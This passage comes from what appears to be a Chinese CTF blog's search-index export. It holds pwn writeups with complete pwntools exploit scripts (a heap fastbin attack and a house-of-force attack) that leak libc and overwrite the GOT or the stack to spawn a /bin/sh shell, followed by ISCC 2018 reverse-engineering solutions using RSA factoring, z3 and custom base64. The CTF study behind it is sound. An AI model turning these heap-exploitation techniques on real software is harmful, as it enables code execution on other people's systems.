&#x3D; &quot; + hex(main_arena_near)main_arena_addr &#x3D; main_arena_near - 0xd8print &quot;main_arena_addr &#x3D; &quot; + hex(main_arena_addr)libc_addr &#x3D; main_arena_addr - main_arena_offsetprint &quot;libc_addr &#x3D; &quot; + hex(libc_addr)one_gadget_addr &#x3D; libc_addr + one_gadget_offsetprint &quot;one_gadget_addr &#x3D; &quot; + hex(one_gadget_addr)environ_addr &#x3D; libc_addr + environ_offsetprint &quot;environ_addr &#x3D; &quot; + hex(environ_addr)# 计算system和&#x2F;bin&#x2F;sh的地址print &quot;\ncalculating system() addr and \&quot;&#x2F;bin&#x2F;sh\&quot; addr ... ###&quot;system_addr &#x3D; libc_addr + libc.symbols[&#39;system&#39;]print &quot;system_addr &#x3D; &quot; + hex(system_addr)binsh_addr &#x3D; libc_addr + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))print &quot;binsh_addr &#x3D; &quot; + hex(binsh_addr)# getpid()# 泄露environ中的值sellbook(2)sellbook(1)add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x21) + p64(book_addr))add_book(&quot;a&quot;, 0, p64(0))## 覆盖bookname指针add_book(&quot;a&quot;, 0, p64(0) * 2 + p64(environ_addr))readbook(0)p.recvuntil(&quot;Bookname:&quot;)stack_addr &#x3D; u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))print &quot;stack_addr &#x3D; &quot; + hex(stack_addr)stack_offset_40 &#x3D; stack_addr - 310# getpid()add_book(&quot;a&quot;, 0x50, &quot;test&quot;)add_book(&quot;a&quot;, 0, &quot;test1&quot;)add_book(&quot;a&quot;, 0, &quot;test2&quot;)add_book(&quot;a&quot;, 0, &quot;test3&quot;)sellbook(7)add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x41) + p64(stack_offset_40))sellbook(8)sellbook(7)add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x41) + p64(stack_offset_40))add_book(&quot;a&quot;, 0x30, &quot;1&quot;)print &quot;stack_addr &#x3D; &quot; + hex(stack_addr)print &quot;stack_offset_40 &#x3D; &quot; + hex(stack_offset_40)# getpid()# 写返回地址为rop# payload &#x3D; &quot;a&quot; * 22 + p64(one_gadget_addr)payload &#x3D; &quot;a&quot; * 22 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)add_book(&quot;a&quot;, 0x30, payload)p.interactive() 三、myhouse(house of force)这道题的got可写，开启NX，PIE没开 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 漏洞点在add_house函数中，v3和size的大小可以不同，通过控制v3，可以实现任意地址写NULL 123456789101112131415161718192021222324252627282930313233343536unsigned __int64 add_house()&#123; int v0; &#x2F;&#x2F; eax size_t size; &#x2F;&#x2F; [rsp+0h] [rbp-30h] __int64 v3; &#x2F;&#x2F; [rsp+8h] [rbp-28h] char s; &#x2F;&#x2F; [rsp+10h] [rbp-20h] unsigned __int64 v5; &#x2F;&#x2F; [rsp+28h] [rbp-8h] v5 &#x3D; __readfsqword(0x28u); memset(&amp;s, 0, 0x10uLL); myputs(&quot;What&#39;s your name?&quot;); read(0, &amp;owner, 0x20uLL); myputs(&quot;What is the name of your house?&quot;); housen &#x3D; malloc(0x100uLL); read(0, housen, 0x100uLL); myputs(&quot;What is the size of your house?&quot;); read(0, &amp;s, 0xFuLL); v0 &#x3D; atoi(&amp;s); v3 &#x3D; v0; size &#x3D; v0; if ( (unsigned __int64)v0 &gt; 0x300000 ) &#123; do &#123; myputs(&quot;Too large!&quot;); read(0, &amp;s, 0xFuLL); size &#x3D; atoi(&amp;s); &#125; while ( size &gt; 0x300000 ); &#125; housed &#x3D; malloc(size); myputs(&quot;Give me its description:&quot;); read(0, housed, size - 1); *((_BYTE *)housed + v3 - 1) &#x3D; 0; return __readfsqword(0x28u) ^ v5;&#125; 利用思路如下： 通过申请大于等于0x200000的内存，那边会用mmap分配，而这个mmap分配的内存跟libc的偏移是固定的 通过控制v3，将null写到top chunk指针的最低位，top chunk指针就指向了house name的最后的16字节的位置（堆地址可以通过owner泄露） 当然在这之前得控制house name的最后一个8字节为8个\xff,这是为house of force做的铺垫 然后我们就可以利用house of force，申请特定的大小的 chunk到house_description_addr 将house_description覆盖为got就可以泄露libc并同时覆盖room，那就可以覆盖atoi的got来getshell了 这里的exp也来自giantbranch大佬 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-# @Date : 2018-12-11 21:43:54# @Author : giantbranch (giantbranch@gmail.com)# @Link : http:&#x2F;&#x2F;www.giantbranch.cn&#x2F;# @tags : from pwn import *context.log_level &#x3D; &quot;debug&quot;p &#x3D; process(&quot;.&#x2F;myhouse&quot;)libc &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)def init(mmap_topchunkpoint_offset): p.recvuntil(&quot;What&#39;s your name?\n&quot;) p.send(&quot;1&quot; * 0x20) p.recvuntil(&quot;What is the name of your house?\n&quot;) p.send(&quot;\x00&quot; * (0x100 - 8) + &quot;\xff&quot; * 8) p.recvuntil(&quot;What is the size of your house?\n&quot;) p.sendline(str(mmap_topchunkpoint_offset)) p.recvuntil(&quot;Too large!\n&quot;) # use mmap and use null byte write bug to write top chunk point p.sendline(str(0x200000)) p.recvuntil(&quot;Give me its description:\n&quot;) p.send(&quot;not use&quot;) def build_room(size): p.recvuntil(&quot;Your choice:\n&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;What is the size of your room?\n&quot;) p.sendline(str(size))def decorate_room(content): p.recvuntil(&quot;Your choice:\n&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Make your room more shining!\n&quot;) p.sendline(content)def show_house(): p.recvuntil(&quot;Your choice:\n&quot;) p.sendline(&quot;3&quot;)def getpid(): print proc.pidof(p)[0] pause()mmap_topchunkpoint_offset &#x3D; 6052713atoi_got &#x3D; 0x602058write_got &#x3D; 0x602018set_buf_plt &#x3D; 0x400710# .bss:00000000006020C0 housedhouse_description_addr &#x3D; 0x00000000006020C0housen_addr &#x3D; 0x602100mmap_system_distance &#x3D; 2384768# use null byte overwrite top chunk point to house of forceinit(mmap_topchunkpoint_offset)# leak heap addrshow_house()p.recvuntil(&quot;1&quot; * 0x20)heap_addr &#x3D; u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))print &quot;heap_addr &#x3D; &quot; + hex(heap_addr)fake_topchunk_addr &#x3D; heap_addr + 240print &quot;fake_topchunk_addr &#x3D; &quot; + hex(fake_topchunk_addr)# fake_topchunk_addr + malloc_size &#x3D; house_description_addr - 0x10malloc_size &#x3D; house_description_addr - 0x20 - fake_topchunk_addr # 劫持到house_description, 写got表，泄露libcbuild_room(malloc_size)build_room(0x100)decorate_room(p64(write_got) + p64(atoi_got))show_house()p.recvuntil(&quot;And description:\n&quot;)write_addr &#x3D; u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))print &quot;write_addr &#x3D; &quot; + hex(write_addr)# 计算system和&#x2F;bin&#x2F;sh的地址print &quot;\ncalculating system() addr ... ###&quot;system_addr &#x3D; write_addr + (libc.symbols[&#39;system&#39;] - libc.symbols[&#39;write&#39;])print &quot;system_addr &#x3D; &quot; + hex(system_addr)# system_addr &#x3D; mmap_addr + mmap_system_distance# print &quot;system_addr &#x3D; &quot; + hex(system_addr)# 覆盖room，写got表decorate_room(p64(system_addr))p.recvuntil(&quot;Your choice:\n&quot;)p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)p.interactive()]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018ISCC_Re_Writeup]]></title>
    <url>%2F2018%2F05%2F29%2F2018ISCC%2F</url>
    <content type="text"><![CDATA[本文为2018ISCC比赛逆向题writeup,文章最下面有相关题目、脚本下载 一、RSA256(100pt)题目告知了是RSA算法，RSA算法不多说了下载下来得到三个加密后的文件，和一个公钥(我把题目搞丢了，大概说下思路) 公钥内容如下： 1234-----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhANmelSKWptlg38JQSrpUW5RC1gp7npMK &#x2F;0UceOxV1VXrAgMBAAE&#x3D; -----END PUBLIC KEY----- 直接把这个公钥丢到网站在线分析：RSA公私钥分解 模数n = D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB 再到网站分解质因数：(注意这里只能填十进制数) 在线分解质因数 q = 302825536744096741518546212761194311477p = 325045504186436346209877301320131277983 这里推荐一个脚本 rsatool.py 专门用于RSA算法的脚本加上参数运行脚本，生成私钥private.pem 命令如下： python rsatool.py -o private.pem -e 65537 -p 302825536744096741518546212761194311477 -q 325045504186436346209877301320131277983t 最后再用openssl，命令如下： 1234openssl rsautl -decrypt -in encrypted.message1 -inkey private.pem -out flag1.decopenssl rsautl -decrypt -in encrypted.message2 -inkey private.pem -out flag2.decopenssl rsautl -decrypt -in encrypted.message3 -inkey private.pem -out flag3.dec 二、My math is bad(150pt)程序是64位elf文件，直接丢入IDA分析，可以知道关键函数两个400766和400B16，先进入400766函数中：先判断输入长度是否为32，我将这些看起来很乱的变量名称重新命名并设置了Hide casts 123456789101112131415161718192021222324252627282930313233343536 if ( strlen(s0) &#x3D;&#x3D; 32 ) &#123; v3 &#x3D; s4; v4 &#x3D; s5; v5 &#x3D; s6; v6 &#x3D; s7; result &#x3D; 0; if ( s1 * *s0 - s3 * s2 &#x3D;&#x3D; 2652042832920173142LL &amp;&amp; 3LL * s2 + 4LL * s3 - s1 - 2LL * *s0 &#x3D;&#x3D; 397958918 &amp;&amp; 3 * *s0 * s3 - s2 * s1 &#x3D;&#x3D; 3345692380376715070LL &amp;&amp; 27LL * s1 + *s0 - 11LL * s3 - s2 &#x3D;&#x3D; 40179413815LL ) &#123; srand(s2 ^ s1 ^ *s0 ^ s3); v1 &#x3D; rand() % 50; v2 &#x3D; rand() % 50; v7 &#x3D; rand() % 50; v8 &#x3D; rand() % 50; v9 &#x3D; rand() % 50; v10 &#x3D; rand() % 50; v11 &#x3D; rand() % 50; v12 &#x3D; rand() % 50; if ( v6 * v2 + v3 * v1 - v4 - v5 &#x3D;&#x3D; 61799700179LL &amp;&amp; v6 + v3 + v5 * v8 - v4 * v7 &#x3D;&#x3D; 48753725643LL &amp;&amp; v3 * v9 + v4 * v10 - v5 - v6 &#x3D;&#x3D; 59322698861LL &amp;&amp; v5 * v12 + v3 - v4 - v6 * v11 &#x3D;&#x3D; 51664230587LL ) &#123; result &#x3D; 1; &#125; &#125; &#125; else &#123; result &#x3D; 0LL; &#125; return result;&#125; 这样就可以明显看出字符串被分为了8段int型的值(s0~s7)，我们需要先求出前4段，解方程组(四元一次方程组) z3求解器：z3是由微软公司开发的一个优秀的SMT求解器（也就定理证明器），它能够检查逻辑表达式的可满足性。linux上的安装方法如下： pip install z3-solver 安装好后我们就可以在python脚本里调用z3这个库，下面上脚本 123456789101112131415161718from z3 import *import structs&#x3D;[Int(&#39;serial%d&#39; % i) for i in range(4)]solver &#x3D; Solver()solver.add(s[1]*s[0]-s[3]*s[2] &#x3D;&#x3D; 2652042832920173142)solver.add(s[2]*3+s[3]*4-s[1]-s[0]*2 &#x3D;&#x3D; 397958918)solver.add(s[0]*3*s[3]-s[2]*s[1] &#x3D;&#x3D; 3345692380376715070)solver.add(s[1]*27+s[0]-s[3]*11-s[2] &#x3D;&#x3D; 40179413815)print(solver.check()) #必须要有这个检查，格式基本固定的answer&#x3D;solver.model()res &#x3D; &quot;&quot;for d in s: num &#x3D; answer.eval(d).as_long() print hex(num) res +&#x3D; struct.pack(&#39;&lt;L&#39;, num)print repr(res) 通过解此方程组，我们轻易得到了前四段flag 接着随机数种子是前四段异或运算后的值，这里不用去计算它，我们用gdb动态调试 gdb在0x4008EF下断，一步一步单步走，可以看到随机数种子的值为0x62d793b 最后获得的伪随机数分别为：0x16,0x27,0x2d,0x2d,0x23,0x29,0xd,0x24下一步再解一个方程组，相同道理，直接上脚本了 123456789101112131415161718192021222324252627282930313233from z3 import *import structdata&#x3D;[Int(&#39;serial%d&#39; % i) for i in range(4)]solver &#x3D; Solver()v3 &#x3D; data[0]v4 &#x3D; data[1]v5 &#x3D; data[2]v6 &#x3D; data[3]v1 &#x3D; 0x16v2 &#x3D; 0x27v7 &#x3D; 0x2dv8 &#x3D; 0x2dv9 &#x3D; 0x23v10 &#x3D; 0x29v11 &#x3D; 0xdv12 &#x3D; 0x24solver.add(v6*v2+v3*v1-v4-v5 &#x3D;&#x3D; 61799700179)solver.add(v6+v3+v5*v8-v4*v7 &#x3D;&#x3D; 48753725643)solver.add(v3*v9+v4*v10-v5-v6 &#x3D;&#x3D; 59322698861)solver.add(v5*v12+v3-v4-v6*v11 &#x3D;&#x3D; 51664230587)print(solver.check())answer&#x3D;solver.model()res &#x3D; &quot;&quot;for d in data: num &#x3D; answer.eval(d).as_long() print hex(num) res +&#x3D; struct.pack(&#39;&lt;L&#39;, num)print repr(res) 获得整段字符串后，进入400B16函数中 12345678910111213141516171819202122232425262728293031323334353637383940414243 v35 &#x3D; *MK_FP(__FS__, 40LL); v3 &#x3D; 39; v4 &#x3D; -20; v5 &#x3D; 19; v6 &#x3D; 1; v7 &#x3D; 7; v8 &#x3D; 6; v9 &#x3D; 52; v10 &#x3D; -61; v11 &#x3D; 72; v12 &#x3D; -57; v13 &#x3D; -33; v14 &#x3D; -79; v15 &#x3D; -97; v16 &#x3D; -37; v17 &#x3D; 25; v18 &#x3D; 45; v19 &#x3D; 4; v20 &#x3D; -15; v21 &#x3D; -111; v22 &#x3D; 10; v23 &#x3D; -94; v24 &#x3D; -46; v25 &#x3D; 21; v26 &#x3D; -43; v27 &#x3D; -19; v28 &#x3D; 53; v29 &#x3D; -112; v30 &#x3D; -36; v31 &#x3D; -44; v32 &#x3D; 60; v33 &#x3D; 63; v34 &#x3D; -12; printf(&quot;flag&#123;&quot;); for ( i &#x3D; 0; i &lt; strlen(s0); ++i ) &#123; srand(*&amp;s0[i]); v0 &#x3D; rand(); putchar(*(&amp;v3 + i) ^ v0 % 255); &#125; puts(&quot;&#125;&quot;); return *MK_FP(__FS__, 40LL) ^ v35;&#125; 这里是对输入的字符串进行简单的运算：取每个字节作随机数种子，产生伪随机数，然后再与v3开始的数据进行异或操作 直接输入咱们通过计算得到的字符串，即可得到最终的flag 三、leftright(150pt)拿到题目后发现有UPX壳，不过也不用脱壳，ESP定律直接到达程序入口点先查找一波字符串，发现疑似flag打乱后长度为29的字符串 那么如果为了节省时间，自然不必弄清被打乱的流程，先构造一个字符串，小写字母26个+3个数字：abcdefghijklmnopqrstuvwxyz123 用OD动态调试，找到最终字符串比较的地方下断，输入我们构造的字符串，右边的寄存器窗口直接显示了已经打乱后的另一串字符串为：onpqmlrskjtuihvwgfxyedz1cb23a 接下来就根据这最终打乱后的每个字符的位置，写出脚本如下： 123456789str0 &#x3D; &quot;s_imsaplw_e_siishtnt&#123;g_ialt&#125;F&quot; str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz123&quot; str2 &#x3D; &quot;onpqmlrskjtuihvwgfxyedz1cb23a&quot; flag &#x3D; &quot;&quot;for i in str1: position&#x3D;str2.find(i) flag+&#x3D;str0[position]print flag 四、obfuscation and encode（250pt）这道题做的时间比较长，主要里面有很多混淆的代码，一开始没找到关键的地方 丢入IDA中分析，两个关键的函数fencode和encode，可以明显看出是我们输入的字符串经过两层加密后与 “lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq” 进行比较，相同即为正确flag. 在fencode函数的代码中，采用了很多while进行混淆，其实关键的地方也就三处 1234561.if ( len !&#x3D; 24 ) &#x2F;&#x2F;这里判断了字符串总长度为242.sum +&#x3D; *(&amp;str[4 * v11] + v8) * *(&amp;m[4 * v10] + v8) &#x2F;&#x2F;这里v11&lt;6 v10&lt;4 v8&lt;4输入的str字符串与m字符串相乘后求和，是个4x4矩阵乘法3.v6 &#x3D; i++; str_out[v6] &#x3D; sum % 127; &#x2F;&#x2F;这里输出str0 % 127运算后的字符串 静态分析的话，沿着控制流分析一波整个流程类似于以下C代码： 123456789101112for(v11&#x3D;0; v11&lt;6; v11++)&#123; for(v10&#x3D;0; v10&lt;4; v10++) &#123; sum &#x3D; 0; for(v8&#x3D;0; v8&lt;4; v8++) &#123; sum +&#x3D; str[4 * v11 + v8] * m[4 * v10 + v8]; &#125; str_out[i++] &#x3D; sum % 127; &#125;&#125; 嵌套循环运算后输出str_out字符串，在encode中对str_out再次加密，找到算法特征处： 从这里可以看出这是一个的base64的算法，不过编码表被改为了：“FeVYKw6a0lDIOsnZQ5EAf2MvjS1GUiLWPTtH4JqRgu3dbC8hrcNo9/mxzpXBky7+”base64加密后的字符串与”lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq” 比较 那么思路已经很明显了，第一层加密同样用Z3求解器解方程组(爆破也可以，但等的太久太久了)，第二层加密在网上找个脚本改下编码表然后解码 先上base64解密脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from numpy import *import numpy as npimport base64import stringimport chardetimport ctypesbase64_charset &#x3D; &#39;FeVYKw6a0lDIOsnZQ5EAf2MvjS1GUiLWPTtH4JqRgu3dbC8hrcNo9&#x2F;mxzpXBky7+&#39;letters &#x3D; list(base64_charset)def encode(input_str): # 对每一个字节取ascii数值或unicode数值，然后转换为2进制 str_ascii_list &#x3D; [&#39;&#123;:0&gt;8&#125;&#39;.format(str(bin(ord(i))).replace(&#39;0b&#39;, &#39;&#39;)) for i in input_str] output_str &#x3D; &#39;&#39; # 不够3的整数倍 补齐所需要的次数 equal_num &#x3D; 0 while str_ascii_list: temp_list &#x3D; str_ascii_list[:3] if len(temp_list) !&#x3D; 3: while len(temp_list) &lt; 3: equal_num +&#x3D; 1 temp_list +&#x3D; [&#39;0&#39;*8] temp_str &#x3D; &#39;&#39;.join(temp_list) # 三个8字节的二进制 转换为4个6字节的二进制 temp_str_list &#x3D; [temp_str[x:x+6] for x in [0, 6, 12, 18]] # 二进制转为10进制 temp_str_list &#x3D; [int(x, 2) for x in temp_str_list] # 判断是否为补齐的字符 做相应的处理 if equal_num: temp_str_list &#x3D; temp_str_list[0:4-equal_num] output_str +&#x3D; &#39;&#39;.join([letters[x] for x in temp_str_list]) str_ascii_list &#x3D; str_ascii_list[3:] output_str &#x3D; output_str + &#39;&#x3D;&#39; * equal_num #print(output_str) return output_strdef decode(input_str): # 对每一个字节取索引，然后转换为2进制 str_ascii_list &#x3D; [&#39;&#123;:0&gt;6&#125;&#39;.format(str(bin(letters.index(i))).replace(&#39;0b&#39;, &#39;&#39;)) for i in input_str if i !&#x3D; &#39;&#x3D;&#39;] output_str &#x3D; &#39;&#39; equal_num &#x3D; input_str.count(&#39;&#x3D;&#39;) while str_ascii_list: temp_list &#x3D; str_ascii_list[:4] temp_str &#x3D; &#39;&#39;.join(temp_list) # 补够8位 if len(temp_str) % 8 !&#x3D; 0: temp_str &#x3D; temp_str[0:-1*equal_num*2] # 4个6字节的二进制 转换 为三个8字节的二进制 temp_str_list &#x3D; [temp_str[x:x+8] for x in [0, 8, 16]] # 二进制转为10进制 temp_str_list &#x3D; [int(x, 2) for x in temp_str_list if x] output_str +&#x3D; &#39;&#39;.join([chr(x) for x in temp_str_list]) str_ascii_list &#x3D; str_ascii_list[4:] #print(output_str) return output_strstr0 &#x3D; decode(&quot;lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq&quot;)int &#x3D; [0]*24for i in range(24): int[i] &#x3D; ord(str0[i])print int 1234567891011121314151617181920212223242526272829from z3 import*key &#x3D; [37, 192, 59, 166, 31, 175, 76, 165, 203, 139, 164, 155, 59, 225, 40, 133, 38, 38, 22, 231, 17, 9, 7, 38]m &#x3D;[2, 2, 4, 4294967291, 1, 1, 3, 4294967293, 4294967295, 4294967294, 4294967293, 4, 4294967295, 0, 4294967294, 2]f1 &#x3D; lambda x1, x2, x3, x4: (x1 * m[0] + x2 * m[1] + x3 * m[2] + x4 * m[3]) &amp; 0xfff2 &#x3D; lambda x1, x2, x3, x4: (x1 * m[4] + x2 * m[5] + x3 * m[6] + x4 * m[7]) &amp; 0xfff3 &#x3D; lambda x1, x2, x3, x4: (x1 * m[8] + x2 * m[9] + x3 * m[10] + x4 * m[11]) &amp; 0xfff4 &#x3D; lambda x1, x2, x3, x4: (x1 * m[12] + x2 * m[13] + x3 * m[14] + x4 * m[15]) &amp; 0xffs &#x3D; Solver()flag &#x3D; [BitVec(str(i), 16) for i in range(24)]for i in xrange(6): s.add(f1(flag[4 * i + 0], flag[4 * i + 1], flag[4 * i + 2], flag[4 * i + 3]) &#x3D;&#x3D; key[i * 4 + 0]) s.add(f2(flag[4 * i + 0], flag[4 * i + 1], flag[4 * i + 2], flag[4 * i + 3]) &#x3D;&#x3D; key[i * 4 + 1]) s.add(f3(flag[4 * i + 0], flag[4 * i + 1], flag[4 * i + 2], flag[4 * i + 3]) &#x3D;&#x3D; key[i * 4 + 2]) s.add(f4(flag[4 * i + 0], flag[4 * i + 1], flag[4 * i + 2], flag[4 * i + 3]) &#x3D;&#x3D; key[i * 4 + 3])for i in xrange(24): s.add(flag[i]&gt;&#x3D;32) s.add(flag[i]&lt;&#x3D;127)print(s.check())answer&#x3D;s.model()res &#x3D; &quot;&quot;for i in range(24): res +&#x3D; chr(answer.eval(flag[i]).as_long())print repr(res) 题目打包下载 密码：d1bm]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>re</tag>
      </tags>
  </entry>
</search>
